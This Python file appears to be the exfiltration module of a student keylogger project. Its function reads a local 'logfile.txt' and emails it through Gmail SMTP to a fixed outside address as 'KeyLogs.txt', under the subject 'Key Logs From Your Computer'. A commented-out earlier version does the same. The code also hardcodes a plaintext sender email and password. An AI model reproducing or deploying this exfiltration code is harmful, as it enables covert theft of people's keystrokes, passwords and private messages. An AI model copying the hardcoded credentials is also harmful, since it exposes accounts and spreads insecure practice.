import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
# import smtplib
# from cred import email,password

# def sendemail():
#     session = smtplib.SMTP('smtp.gmail.com', 587)

#     session.starttls()

#     session.login(email,password)

#     with open('logfile.txt','r', encoding='utf-8') as file:
#         message = file.read()

#     session.sendmail(email, email, message)

#     print("Email Sent Successfully")

#     session.quit()    







def sendemail():
        mail_content = '''Hello, Sir Here are some of the key logs Please Find the attachment.
'''
#The mail addresses and password
        sender_address = 'kedar@mitaoe.ac.in'
        sender_pass = 'kedar1023'
        receiver_address = 'sspathak@mitaoe.ac.in'
        #Setup the MIME
        message = MIMEMultipart()
        message['From'] = sender_address
        message['To'] = receiver_address
        message['Subject'] = 'Key Logs From Your Computer'
        #The subject line
        #The body and the attachments for the mail
        message.attach(MIMEText(mail_content, 'plain'))
        attach_file_name = 'logfile.txt'
        attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
        payload = MIMEBase('application', 'octate-stream')
        payload.set_payload((attach_file).read())
        encoders.encode_base64(payload) #encode the attachment
        #add payload header with filename
        
        payload.add_header('Content-Disposition', 'attachment', filename= "KeyLogs.txt")
        message.attach(payload)
        #Create SMTP session for sending the mail
        session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
        session.starttls() #enable security
        session.login(sender_address, sender_pass) #login with mail_id and password
        text = message.as_string()
        session.sendmail(sender_address, receiver_address, text)
        session.quit()
        print('Mail Sent')
        